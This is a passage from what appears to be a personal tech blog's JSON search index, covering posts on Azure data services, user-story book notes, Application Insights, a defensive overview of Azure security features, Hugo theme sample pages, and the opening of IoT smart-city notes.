Big Data simpler and more accessible by providing several key technologies. The U-SQL language is a powerful combination of SQL and C# that supports parallel execution.\nAzure Data Factory (ADF) is a cloud-based data integration service that orchestrates and automate the movement and transformation of data.\ncreate linked services, datasets, pipelines for source (blob), target (datawarehouse) table and columns need to be setup in datawarehouse The ADL-ADF integration allows you to:\nMove data from a given source to the ADL store Create BigData ADF pipelines that run U-SQL as a processing step on the ADL Analytics service Learn more Azure Data Architecture Guide\nhttps://docs.microsoft.com/en-us/azure/architecture/data-guide/\nWritten by Binwei@Singapore\n","link":"http://localhost:1313/post/2019/azure_datalake_warehouse/","section":"post","tags":["cloud"],"title":"Azure Data Lake and Warehouse"},{"body":"User Story Applied Published: Apr 21, 2019 Tags: booknotes, process Category: ComputerScience\nThis blog is the book notes for user story applied.\nTable of Contents User stories principles A good story is: Independent, Negotiable, Valuable to users or customers, Estimable, Small, Testable\nUser stories emphasize verbal rather than written communication User stories are comprehensible by both stakeholders and the developers User stories are the right size for planning User stories work for iterative development User stories encourage deferring detail until you have the best understanding you are going to have about what you really need. Emphasize verbal communication There’s nothing wrong with making a few annotations on a story card based on a discussion. However, the conversation is the key, not the note on the story card.\nA story card is the visible part of a story, but the important parts are the conversations between the customer and developers about the story.\nIt is useful to think of the story card as containing:\na phrase or two that act as reminders to hold the conversation notes about issues to be resolved during the conversation Most customers begin writing stories themselves once they become comfortable with the concept that story cards are reminders to talk later rather than formal commitments or descriptions of specific functionality.\nComprehesible by both stakeholders and developers The customer team may include testers, a product manager, real users, and interaction designers.\nThe customer team includes those who ensure that the software will meet the needs of its intended users. The customer team writes the story cards because they are in the best position to express the desired features and because they must later be able to work out story details with the developers and to prioritize the stories.\neach story must be written in the language of the business, not in technical jargon, so that the customer team can prioritize the stories for inclusion into iterations and releases. as the primary product visionaries, the customer team is in the best position to describe the behavior of the product. Right size for planning When a story is too large it is sometimes referred to as an epic.\nEpics typically fall into one of two categories: The compound story or the complex story.\nThe ultimate determination of whether a story is appropriately sized is based on the team, its capabilities, and the technologies in use.\nIterative development Once an iteration length has been selected, the developers will estimate how much work they’ll be able to do per iteration.\nRelease planning refers to determining a balance between a projected timeline and a desired set of functionality. Iteration planning refers to selecting stories for inclusion in this iteration. Stories are prioritized based on their value to the organization. Releases and iterations are planned by placing stories into iterations. Velocity is the amount of work the developers can complete in an iteration.\nThe sum of the estimates of the stories placed in an interation cannot exceed the velocity the developers forecast for that iteration. If a story won’t fit in an iteration, you can split the story into two or more smaller stories\nValuable to users or customers A story card contains a short description of user or customer-valued functionality\nAcceptance tests validate that a story has been developed with the functionality the customer team had in mind when they wrote the story.\nKeeping in mind the distinction between user (someone who uses the software) and purchaser (someone who purchases the software).\nSuppose a development team is building software that will be deployed across a large user base, perhaps 5,000 computers in a single company. The purchaser of a product like that may be very concerned that each of the 5,000 computers is using the same configuration for the software. This may lead to a story like “All configuration information is read from a central location.” Users don’t care where configuration information is stored but purchasers might.\nEstimable It is important for developers to be able to estimate (or at least take a guess at) the size of a story or the amount of time it will take to turn a story into working code.\nThere are three common reasons why a story may not be estimable:\nDevelopers lack domain knowledge Developers lack technical knowledge The story is too big The solution for 2nd reason is to send one or more developers on what Extreme Programming calls a spike, which is a brief experiment to learn about an area of the application.\nThe spike itself is always given a defined maximum amount of time (called a time-box), which allow us to estimate the spike. In this way an inestimable story turns into two stories: a quick spike to gather information and then a story to do the real work.\nTestable Details that have already been determined through conversations become tests. Tests can be noted on the back of the story card if using note cards or in whatever electronic system is being used.\nStories must be written so as to be testable. Successfully passing its tests proves that a story has been successfully developed. If the story cannot be tested, how can the developers know when they have finished coding?\nStory Writting However, even though we acknowledge the impossibility of writing all of the stories for a project, we should still make an initial upfront attempt to write those that we can, even if many are written at a very high level. One of the advantages of working with stories is that it is very easy to write them at different levels of detail.\nSome of the most valuable techniques for creating a set of stories are:\nUser interviews Questionnaires Observation Story-Writing workshops During a story writing workshop the focus should be on quantity rather than quality. Even if you'll eventually keep your stories electronically, during the story-writing workshop use cards. Just let the ideas come and write them down. The goal is to write as many user stories in as short a time as possible. This is not the time to design screens or solve problems.\nKeep the user interface out of your stories as long as possible.\nEach story was written in the following format: I as a (role) want (function) so that (business value)\nWrite in Active Voice: rather than saying \u0026quot;A resume can be posted by a Job Seeker\u0026quot; say \u0026quot;A Job Seeker can post a resume.\u0026quot;\nStories that represent a full slice of cake are to be preferred over those that do not. There are two reasons for this.\nexercising each layer of an application's architecture reduces the risk of finding last minute problems in one of the layers. although not ideal, an application could conceivably be released for use with only partial functionality as long as the functionality that is included in the release slices all the way through the system. Even though constraint cards do not get estimated and scheduled into iterations like normal cards, they are still useful. Minimally, constraint cards can be taped to the wall where they act as reminders. Even better, acceptance tests can be written to ensure the constraint is not violated.\nFrequently the risky stories are associated with infrastructural or nonfunctional needs such as performance.\nUser Story Mapping: The talking goes better if we can externalize our thinking by drawing pictures or organizing our ides using index cards or sticky notes. The real goal of using stories is shared understanding\nUser role On many projects, stories are written as though there is only one type of user. All stories are written from the perspective of that user type.\nThis simplification is a fallacy and can lead a team to miss stories for users who do not fit the general model of the system’s primary user type. This disciplines of usage-centered design and interaction design teach us the benefits identifying user roles and personas prior to writing stories.\nA user role is a collection of defining attributes that characterize a population of users and their intended interactions with the system. We will use the following steps to identify and select a useful set of user roles:\nbrainstorm an initial set of user roles organize the initial set consolidate roles refine the roles Identifying user roles is a great leap forward, but for some of the more important user roles, it might be worth going one step further and creating a persona for the role. A persona is an imaginary representation of a user role.\nFor some applications, extreme characters may be helpful in looking for stories that would otherwise be missed.\nTests Naturally, in order for programmers to benefit in this way, the acceptance tests for a story must be written before programming begins on that story.\nTests are generally written at the following times:\nwhenever the customer and developers talk about the story and want to capture explicit details as part of a dedicated effort at the start of an iteration but before programming begins whenever new tests are discovered during or after the programming of the story With user stories it is vital that testing be viewed as part of the development process, not something that happens \u0026quot;after coding is done.\u0026quot; Specifying tests is often a shared responsibility of a product manager and a tester. The product manager will bring her knowledge of the organizational goals driving the project; the tester will bring his suspicious mindset. At the start of an iteration they will get together and specify as many initial tests as they can think of. But it doesn't stop there, and it doesn't stop with them getting together once a week. As the details of a story are worked out, additional tests are specified.\nBecause working code from one iteration may be broken by development in a subsequent iteration, it is important to execute acceptance tests from all prior iterations. This means that executing acceptance tests gets more time consuming with each passing iteration. If possible, the development team should look into automating some or all of the acceptance tests.\nFor most systems, story testing is largely functional testing, which ensures that the applicaton functions as expected.\nUser interface testing, which ensures that all of the components of the user interface behave as expected Usability testing, which is done to ensure an application that can be easily used Performance testing, which is done to gauge how well the application will perform under various workloads Stress testing, in which the application is subjected to extreme values of users, transactions, or anything else that may put the application under stress Customers and users Selection of appropriate user proxies can be critical to the success of the project.\nThe background and motives of possible user proxies must be considered. A user proxy with a marketing background will approach the stories differently than will a user proxy who is a domain expert. While domain experts are great resources, their usefulness is really dependent upon whether they are current or former users of the software type you are building. Domain experts can be inclined to point the project toward a solution that is suitable for them but is too complex or is just plain wrong for the targeted user audience.\nCustomers are those who make the buying decision; they are not necessarily users of the software.\nFirst, always remember that a real user beats a proxy any time.\nOn a large project, especially one with many user roles, it is sometimes difficult to even know where to begin in identifying stories. What I've found works best is to consider each user role and identify the goals that user has for interacting with our software.\nPlanning Bug reports and user interface changes are common examples of stories that are often too small. A good approach for tiny stories, common among Extreme Programming teams, is to combine them into larger stories that represent from about a half-day to several days of work.\nEstimation we'll see that a story comprises multiple tasks and that a task estimate is owned by the individual who will perform the task.\nStory estimates, however, are owned by the team for two reasons:\nsince the team doesn't yet know who will work on the story, ownership of the story cannot be more precisely assigned than to the team collectively. estimates derived by the team, rather than a single individual, are probably more useful. We use the term velocity to refer to the number of story points a team completes (or expects to complete) in an iteration.\nWhether or not a team programs in pairs has no impact on story point estimates. Pair programming affects the team's velocity, not their estimates.\nPriority It is frequently useful to start release planning from a product development roadmap showing the main areas of focus for the next handful of new releases.\nThere are many dimensions along which we can sort stories.\nAmong the technical factors we can use are:\nthe risk that the story cannot be completed as desired (for example, with desired performance characteristics or with a novel algorithm) the impact the story will have on other stories if deferred (we don't want to wait until the last iteration to learn that the application is to be three-tiered and multi-threaded) Additionally, customers and users have their own set of factors they could use to sort the stories, including the following:\nthe desirability of the story to a broad base of users or customers the desirability of the story to a small number of important users or customers the cohesiveness of the story in relation to other stories (for example, a \u0026quot;zoom out\u0026quot; story may not be high priority on its own but may be treated as such because it is complementary to \u0026quot;zoom in,\u0026quot; which is high priority) Collectively, the developers have a sequence in which they would like to implement the stories, as will the customer. When there is a disagreement to the sequence, the customer wins. Every time.\nCost Changes Priority\nAgile approaches are firmly in the camp of doing the juicy bits first. This allows agile projects to avoid solving risks too far in advance and allows them to defer building infrastructural code that may not be needed. Favoring the juicy bits also makes it possible for a project to release early, when only the highest-valued functionality is available.\nInteration Collectively the developers and the customer select an iteration length that will work for them. Iteration lengths are typically from one to four weeks.\nShort iterations allow for more frequent course corrections of the project and more visibility into its progress; however, there is a slight overhead associated with each iteration.\nAs much as possible, stick with a constant iteration length for the duration of the project. With consistent iterations, projects fall into a natural rhythm that can be beneficial to the pace of the team.\nNaturally there will be times when you need to alter the iteration length. For example, a team that has been using three-week iterations is asked to prepare the next version for an important tradeshow in eight weeks. Rather than stopping after two three-week iterations with two weeks left before the show, they can start with two normal three-week iterations and then follow those with an abbreviated two-week iteration. There's nothing wrong with this. What you want to avoid is random changes to the iteration length.\nThere are three ways to get an initial value for velocity:\nUse historical values. Run an initial iteration and use the velocity of that iteration. Take a guess. To plan an iteration the whole team holds an iteration planning meeting. The customer as well as all of the developers (that is, programmers, testers and others) on the team attend and participate in this meeting. Because the team will be looking at the stories in detail, they will undoubtedly have some questions about them. They need the customer present to answer these questions.\nThe general sequence of activities for an iteration planning meeting is as follows:\nDiscuss a story. Disaggregate the story into its constituent tasks. One developer accepts responsibility for each task. After all stories have been discussed and all tasks have been accepted, developers individually estimate the tasks they've accepted to make sure they are not over-committed.\nyou should not include partially completed stories when calculating velocity. Velocity Does Not Use Actual Hours.\nWritten by Binwei@Singapore\n","link":"http://localhost:1313/post/2019/user_story_applied/","section":"post","tags":["booknotes","process"],"title":"User Story Applied"},{"body":"Application Insight Introduction Published: Apr 20, 2019 Tags: cloud, telemetry Category: ComputerScience\nThis blog introduces what Application Insight can do.\nApplication Insight Basics Application Insights is aimed at the development team, to help you understand how your app is performing and how it's being used.\nIt includes functions:\nDetect, triage, and diagnose issues in web apps and services (Detect: Know about any issues before your users, Triage: how many users are affected? How often does this happen? Diagnose: Where is the problem? When does it happen?) Detect issues through email and webhook alerts Diagnose exceptions and web app performance issues Perform root cause analysis with ad-hoc queries and full-text search Live application monitoring HTTP request rates, response times, success rates. Dependency (HTTP \u0026amp; SQL) call rates, response times, success rates. Exception traces from both server and client. Page view counts, user and session counts, browser load times, exceptions. AJAX call rates, response times and success rates. Server performance counters. (your Windows or Linux server machines, such as CPU, memory, and network usage) Segmentation by client location, browser version, OS version, server instance, custom dimensions, and more. Availability tests. Host diagnostics from Docker or Azure. Diagnostic trace logs from your app - so that you can correlate trace events with requests. Custom events and metrics that you write yourself in the client or server code, to track business events such as items sold or games won. Integrate with DevOps processes using Visual Studio Team Services Monitor web apps hosted on Azure, other cloud services, or on-premises servers Get started with Visual Studio or monitor existing apps without re-deploying Diagnostic and analytic tools:\nSmart and manual alerts on failure rates and other metrics, and on availability. Charts over time of aggregated metrics. Diagnostic search on instances of requests, exceptions, custom events, log traces, page views, dependency and AJAX calls. Analytics - a powerful query language over your telemetry Dashboards - compose the charts you need to monitor all your app components. The Dependency Duration chart shows the time taken by calls from your app to external components such as databases, REST APIs, or Azure blob storage. Application map Profiler Live Metrics Stream Visual Studio Snapshot debugger Power BI REST API Continuous Export Other Good Articles Azure cloud service support: https://docs.microsoft.com/en-us/azure/azure-monitor/app/cloudservices\nFeed PowerBI with application insight: https://docs.microsoft.com/en-us/azure/azure-monitor/app/export-power-bi\nBilling service https://github.com/Microsoft/peek\nPlatform support: https://docs.microsoft.com/en-us/azure/azure-monitor/app/platforms\nWork item for app insight: https://azure.microsoft.com/en-us/blog/application-insights-work-item-integration-with-visual-studio-team-services/\nApplication insight can also support Application Performance Management (APM) and AB testing.\nWritten by Binwei@Singapore\n","link":"http://localhost:1313/post/2019/application_insight_introduction/","section":"post","tags":["cloud","telemetry"],"title":"Application Insight Introduction"},{"body":"","link":"http://localhost:1313/tags/telemetry/","section":"tags","tags":null,"title":"Telemetry"},{"body":"Azure Security Published: April 19, 2019 Tags: security, cloud Category: ComputerScience\nCyber Security is important aspect to digital transformation. To use Azure well, the understanding of the security building blocks is crucial.\nhttps://docs.microsoft.com/en-us/azure/security/azure-security-getting-started\nTable of Contents Security Basics Every company has some level of security requirement that stretches across almost every element of the business. It's important to think of security in layers rather than a single protection element.\nDefense in Depth: The best security is based on layers of protection and this is especially true with networking. See following picture.\nIt's also important to ensure security while not crippling the business ability to operate. Make security a core step of any new project, of change control, of anything you do.\nKey Security Areas +---------------------------+-----------------------------------------------+ | Identity and access | Being sure you are who you say you are | +---------------------------+-----------------------------------------------+ | Network security | Secure access, isolation, and publishing | +---------------------------+-----------------------------------------------+ | Data protection | Encryption of data at rest and in transit | +---------------------------+-----------------------------------------------+ | Protecting secrets | Keys, certificates, credentials | +---------------------------+-----------------------------------------------+ | System integrity | Patched, protected, etc | +---------------------------+-----------------------------------------------+ | Insight | Auditing, system state, health | +---------------------------+-----------------------------------------------+\nSecurity terminology +----------------+-------------------------------------------------------------------------------+ | Asset | People, property, or information (database, software code, company records) | +----------------+-------------------------------------------------------------------------------+ | Threat | Person or process that can exploit a vulnerability (intentionally or | | | accidentally) to obtain, damager, or destroy an asset | +----------------+-------------------------------------------------------------------------------+ | Vulnerability | Weakness or gap in a security program that can be exploited by threats to | | | gain unauthorized access to an asset | +----------------+-------------------------------------------------------------------------------+ | Risk | The potential for loss, damage, or destruction of an asset as a result of a | | | threat exploiting a vulnerability | +----------------+-------------------------------------------------------------------------------+\nAzure security services overview Identity and Access Azure Role Based Access Control Azure Active Directory /B2C/B2B Azure Multi-Factor Authentication Hybrid identity with Microsoft Azure: Microsoft’s identity solutions span on-premises and cloud-based capabilities, creating a single user identity for authentication and authorization to all resources, regardless of location. Network Security Network Security Groups: While Virtual Network (VNET) is the cornerstone of Azure networking model and provides isolation and protection. Network Security Group (NSG) is the main tool you need to use to enforce and control network traffic rules at the networking level. Customers can control access by permitting or denying communication between the workloads within a virtual network, from systems on customer’s networks via cross-premises connectivity, or direct Internet communication. Azure VPN Gateway: A VPN gateway is a specific type of virtual network gateway that is used to send encrypted traffic between an Azure virtual network and an on-premises location over the public Internet. Azure Application Gateway: Azure Application Gateway is a web traffic load balancer that enables you to manage traffic to your web applications. Azure Load Balancer: With Azure Load Balancer, you can scale your applications and create high availability for your services. Azure Traffic Manager: Azure Traffic Manager is a DNS-based traffic load balancer that enables you to distribute traffic optimally to services across global Azure regions, while providing high availability and responsiveness. Azure Application Proxy: Azure Active Directory's Application Proxy provides secure remote access to on-premises web applications. After a single sign-on to Azure AD, users can access both cloud and on-premises applications through an external URL or an internal application portal. Route Control and Forced Tunneling: Forced tunneling lets you redirect or \u0026quot;force\u0026quot; all Internet-bound traffic back to your on-premises location via a Site-to-Site VPN tunnel for inspection and auditing. Virtual Network Security Appliances: Use your favorite network virtual appliances in Azure Azure Virtual Network: Your private network in the cloud Express Route: Experience a faster, private connection to Azure Internal DNS \u0026amp; Azure DNS Data Protection Azure Storage Security\nAzure Storage Service Encryption (for data at rest) StorSimple Encrypted Hybrid Storage (an integrated storage solution that manages storage tasks between on-premises devices and Azure cloud storage.) Azure Client-Side Encryption Azure Storage Shared Access Signatures Azure Storage Account Keys Azure File Shares with SMB 3.0 Encryption: The Server Message Block (SMB) protocol is a network file sharing protocol that allows applications on a computer to read and write to files and to request services from server programs in a computer network. The SMB protocol can be used on top of its TCP/IP protocol or other network protocols. Using the SMB protocol, an application (or the user of an application) can access files or other resources at a remote server. This allows applications to read, create, and update files on the remote server. It can also communicate with any server program that is set up to receive an SMB client request. Azure Storage Analytics Role-based access control (RBAC) Encryption in Transit Enabling Browser-based clients using CORS Do not copy production db, but use SQL DB Data Masking\nBackup and Disaster Recovery\nAzure Backup Azure Site Recovery Azure Database Security\nAzure SQL Firewall Azure SQL Authentication Azure SQL Transparent Data Encryption: Transparent Data Encryption (TDE) encrypts SQL Server, Azure SQL Database, and Azure SQL Data Warehouse data files, known as encrypting data at rest. Azure SQL Database Auditing Protecting secrets Azure Key Vault\nSystem integrity Applications\nWeb Application vulnerability scanning Penetration testing Web Application firewall (WAF) Layered Security Architecture Web server diagnostics and application diagnostics Antimalware \u0026amp; Antivirus Hardware Security Module Virtual machine backup VM Disk Encryption (IaaS VM disk) Patch updates Security policy management and reporting Insight Operations Management Suite Security and Audit Dashboard Azure Resource Manager Application Insights Azure Monitor Log Analytics Azure Advisor Azure Security Center Authentication Options Authentication in the Public cloud Communication over the public cloud has to be focused on protocols commonly available. HPPTS is preferred and often required because it is encrypted with SSL.\nAuthentication commonly used:\nOAuth OAuth 2 (used by Azure AD) SAML Azure Active Directory Provide access to web-based services Identity infrastructure of the future Expanding constantly Limited but growing features Limited control over user environment Active Directory Domain services Access to on-premises resources Current and past identity infrastructure Been pretty constant for over a decade Full featured implementation Infrastructure is built and maintained Fine-grain control of user environment Applications within the configured virtual network can leverage Azure AD in a similar way to AD DS (LDAP, join domain, Kerberos, NTLM) Useful where AD DS needed but don't want the management or cost of traditional AD DS Custom domain name To simplify the full name of azure AD url Verify through your own hosting website (e.g. hostmonster) Azure AD Connect Azure AD Connect tool is to connect the local AD to Azure AD.\nAnd you can activate or deactivate the sync between Azure AD and local AD.\nAzure AD Connect !== AD Federation\nPrivileged Identity management: Azure AD P2 No standing privileges is a common security goal. Ideally accounts have privileges elevated only when required.\nAzure AD Privileged Identity Management (PIM) enables users/groups to have roles assigned. The user must then request elevation, typically also with MFA along with an optional comment. The elevation is for a configurable amount of time per role.\nA big focus is for a single identity across all systems and clouds. It is critical that the identity is as secure and monitored as possible.\nAzure AD Identity Protection provides a centralized view of risk events, risk users and vulnerabilities. Can be utilized as part of conditional access to add user risk level as a condition.\nTypical Capabilities\nBrowser Based Authentication Mobile Device Authentication Multi-Factor Authentication Login to your corporate directory Single Sign On (to SaaS apps) Social Login Identity as a service How else does IDaaS help?\nDDOS prevention at the provider, not at your app User Management Block suspicious login Prompt for MFA Protocol based protection at the app (OpenlD Connect / OAuth2) Centralized user management Audit logs, reports Compliance Azure Key Vault An Azure resource provider backed by pools of hardware security modules (HSMs)\nProvides storage:\nSecrets - Pieces of data (under 25KB) that can be stored and retrieved Keys - Stored and then used within the key vault to perform cryptographic operations (but cannot be retrieved) Certificates - Management of x509 certificates including lifecycle Authentication and Authorization Authentication is via Azure AD OAuth2 tokens.\nAuthorization is via Access Control List (ACL) on the key vault.\nTypical structure is as follows: Key Vault Owner; Key/Secret Owner; App Operator; Auditor\nStore your private keys, shared secrets, other connections, securely FIPS (Federal Information Processing Standard) compliant option HSM storage ($$) Examples: Private keys, certs, passwords; Connection strings; Secrets and account names for service bus, storage, search, redis, etc. Networking Connecting Virtual Networks\nIf Virtual networks exist in the same region and use the same Azure AD tenant network peering can be used to connect them using the Azure backbone network Another option is to utilize site-to-site VPN or ExpressRoute where network peering is not possible Site-to-site VPN or ExpressRoute are used to connect to on-premises locations NSG Rules: Rules are based on 5-tuple and have priority and action (allow or deny)\nSource IP address (can be a range using CIDR format) Source port Destination IP address (can be a range using CIDR format) Destination port Protocol (TCP, UDP, or * ) Non-VNet Azure Services\nMost non-laaS services do not directly integrate with VNets The services have an Internet public facing endpoint Some services provide a configurable firewall to control access based on public IP address and if from an Azure service When enabling for Azure services it means any service for any tenant running in Azure If more granularity required, look to utilize a public IP from the source service and restrict based on that IP Virtual Appliances\nA large number of virtual appliances are available in the Azure Marketplace Licensing can be based on: Bring your own license or Hourly billing Essentially a VM with pre-configured software and configuration to perform a certain set of functionality Common examples include firewalls and load balancers Azure Application Gateway\nA layer 7 reverse-proxy solution Terminates the client connection and forwards requests to target Application protocols support HTTP, HTTPS and WebSockets Supports SSL termination (offloading the CPU from the endpoints) Internet facing and Internal (VNet) applications Provides a layer of abstraction from the requesting client and the back-end service Web Application Firewall\nOptional addition to Azure Applicaiton Gateway Provides a web application firewall solution Implements CRS 3.0 by default (2.2.9 also available) (Core Rule Set) Rules can be disabled on an individual basis if required Detection or prevention mode Some practices\nLogically segment subnets: use nsgs for inter-subnet traffic Control routing: used with virtual network applicances Enable forced trunneling: constrain outbound VM traffic Disable RDP/SSH: employ P2S or S2S VPNs Enable Azure Security Center: Prevent, detect, and respond to threats Other Services and practices Azure Security Center AAA: authentication, authorization, accounting\nSIEM (Security information and event management)\nRecommend actions to take to secure your VMS Define policies Export logs for analysis Integration with Operations Management System (OMS) Azure Trust center Compliance Requirements\nInfrastructure: ISO 27001, 0 SAS 70 Type Il, SSAE 16 Audit: Third party review/ NIST SP 800-53; Third party pen test OWASP or OSSTMM; Third party NESSUS scan You can see the certificates http://azure.microsoft.com/en-us/support/trust-center/compliance/\nVirtual Machines Disabling unused services on VM i.e., no guest accounts, services run with least privilege Keep machines patched, up to date Updating out of date software Azure Security Center can help here Password / User Account Policies Initial password issuance Password strength Password reuse Frequency of change Admin password special requirements Hash algorithms / key lengths Inactivity, login failure, account blocking Non-obvious account names Delivery of account/password materials De-provisioning / access revocation No sharing of accounts Database Access Requirements Limited to individuals: Application / system accounts; Few admin / read only All access to data is controlled via applications Never, never, never log in to the database and fix issues directly with content/data: At least this is the goal; Build tools to solve data problems instead, track repeat offenders Resource and Role Azure resource manager\nevery object is a resource every resource belongs to a single resource group resource groups are not a resource access boundary Resource Groups\nresources in a resource group should share a common lifecycle Resource groups can be heterogeneous or homogeneous Resource groups are not a boundary of access Role-based access control\nWith ARM the access to resources and the actions possible can be finely controlled A major use for resource group is with RBAC by grouping resources together in a resource group then delegate authority to groups of users on the resource group RBAC and also apply to entire subscriptions or an individual resource Enables assignment of roles at various levels: The subscription; A resource group; An individual resource Assigned rights are inherited by child objects Combine with Azure AD groups which contain users Assign Azure AD groups to a role at the desired level Built-in roles\nlarge number of in-box roles not every role applies to infrastructure when looking at a resource only its relevant roles will be displayed classic resource have smaller set of available roles and only at subscription level select a role and a resource provider to see detailed permissions of the role Written by Binwei@Singapore\n","link":"http://localhost:1313/post/2019/azure_security/","section":"post","tags":["cloud","security"],"title":"Azure Security"},{"body":"","link":"http://localhost:1313/tags/markdown/","section":"tags","tags":null,"title":"Markdown"},{"body":"This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\nHeadings The following HTML \u0026lt;h1\u0026gt;—\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1 H2 H3 H4 H5 H6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nImages Local image, alt text as caption The following image is located within the Hugo site. Because it has alt text but no title text, the caption is generated by the alt text.\nRemote image, specified caption The following image is loaded from a remote URL. The alt text is the same (for screen readers and in cases when the image doesn't load) but because a separate title is provided, the title is used for the caption:\nThis is Jane Doe\rImage with alt text and no caption Alt text is always recommended for SEO, accessibility and in cases when images don't load. However, you don't necessarily always want an image to have a caption. In that case, use a title with one space:\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution Tiam, ad mint andaepu dandae nostion secatur sequo quae. Note that you can use Markdown syntax within a blockquote.\nBlockquote with attribution Don't communicate by sharing memory, share memory by communicating.\n— Rob Pike1\nTables Tables aren't part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\nName Age Bob 27 Alice 23 Inline Markdown within tables Italics Bold Code italics bold code Code Blocks Code block with backticks 1\u0026lt;!doctype html\u0026gt; 2\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; 3\u0026lt;head\u0026gt; 4 \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; 5 \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; 6\u0026lt;/head\u0026gt; 7\u0026lt;body\u0026gt; 8 \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; 9\u0026lt;/body\u0026gt; 10\u0026lt;!-- this line is extraneous 2Error from server (Forbidden): deployments.apps is forbidden: User \u0026#34;chiptest\u0026#34; cannot create resource \u0026#34;deployments\u0026#34; in API group \u0026#34;apps\u0026#34; in the namespace \u0026#34;default\u0026#34; --\u0026gt; 11\u0026lt;/html\u0026gt; Code block indented with four spaces \u0026lt;!doctype html\u0026gt;\r\u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charset=\u0026quot;utf-8\u0026quot;\u0026gt;\r\u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\rCode block with Hugo's internal highlight shortcode 1\u0026lt;!doctype html\u0026gt; 2\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; 3\u0026lt;head\u0026gt; 4 \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; 5 \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; 6\u0026lt;/head\u0026gt; 7\u0026lt;body\u0026gt; 8 \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; 9\u0026lt;/body\u0026gt; 10\u0026lt;/html\u0026gt; List Types Ordered List First item Second item Third item Unordered List List item Another item And another item Nested list Fruit Apple Orange Banana Dairy Milk Cheese Other Elements — abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL+ALT+Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\nThe above quote is excerpted from Rob Pike's talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","link":"http://localhost:1313/post/hugo/markdown-syntax/","section":"post","tags":["markdown","hugo"],"title":"Markdown Syntax Guide"},{"body":"Hugo ships with several Embedded Shortcodes for rich content, along with a Privacy Config and a set of Simple Shortcodes that enable static and no-JS versions of various social media embeds.\nInstagram Simple Shortcode YouTube Privacy Enhanced Shortcode X Simple Shortcode Owl bet you\u0026#39;ll lose this staring contest 🦉 pic.twitter.com/eJh4f2zncC\n\u0026mdash; San Diego Zoo Wildlife Alliance (@sandiegozoo) October 26, 2021 See shortcode documentation for more details.\nVimeo Simple Shortcode ","link":"http://localhost:1313/post/hugo/rich-content/","section":"post","tags":["hugo"],"title":"Rich Content"},{"body":"Mathematical notation in a Hugo project can be enabled by using third party JavaScript libraries.\nIn this example we will be using KaTeX\nCreate a partial under /layouts/partials/hooks/head-end.html Add these lines to the newly created partial: 1{{ if or .Params.math .Site.Params.math }} 2{{ partial \u0026#34;math.html\u0026#34; . }} 3{{ end }} To enable KaTeX globally set the parameter math to true in a project's configuration To enable KaTeX on a per page basis include the parameter math: true in content files Note: Use the online reference of Supported TeX Functions\nExamples Block math: $$ \\varphi = 1+\\frac{1} {1+\\frac{1} {1+\\frac{1} {1+\\cdots} } } $$\n","link":"http://localhost:1313/post/hugo/math-typesetting/","section":"post","tags":["hugo"],"title":"Math Typesetting"},{"body":"Emoji can be enabled in a Hugo project in a number of ways.\nThe emojify function can be called directly in templates or Inline Shortcodes.\nTo enable emoji globally, set enableEmoji to true in your site's configuration and then you can type emoji shorthand codes directly in content files; e.g.\n🙈 :see_no_evil: 🙉 :hear_no_evil: 🙊 :speak_no_evil:\nThe Emoji cheat sheet is a useful reference for emoji shorthand codes.\nN.B. The above steps enable Unicode Standard emoji characters and sequences in Hugo, however the rendering of these glyphs depends on the browser and the platform. To style the emoji you can either use a third party emoji font or a font stack; e.g.\n1.emoji { 2 font-family: Apple Color Emoji, Segoe UI Emoji, NotoColorEmoji, Segoe UI Symbol, Android Emoji, EmojiSymbols; 3}","link":"http://localhost:1313/post/hugo/emoji-support/","section":"post","tags":["hugo"],"title":"Emoji Support"},{"body":"Iot for Smart Cities Published: Feb 10, 2019 Tags: iot, booknotes, smartcity Category: ComputerScience\nSmart cities: Everyone's connected If everyone, every home, and every business is connected via the IoT, why not take the next step and connect your entire neighborhood, or even the whole city? Connected devices can help reduce congestion on local roadways, alert the fire department in case of emergencies, and even signal the need for road maintenance or additional police patrols. The smart city might mean a smaller government – or a more intrusive one. It all depends.\nIntroduction The IoT has a lot to offer municipalities of all size. In fact, there's a recognized smart city concept floating around, kind of a template or set of guidelines that cities across the United States and around the world can model going forward.\nThe goals of the smart city are to make better use of public resources, increase the quality of services offered to citizens, and reduce operational costs of the public administrations. To achieve these goals, the smart city must 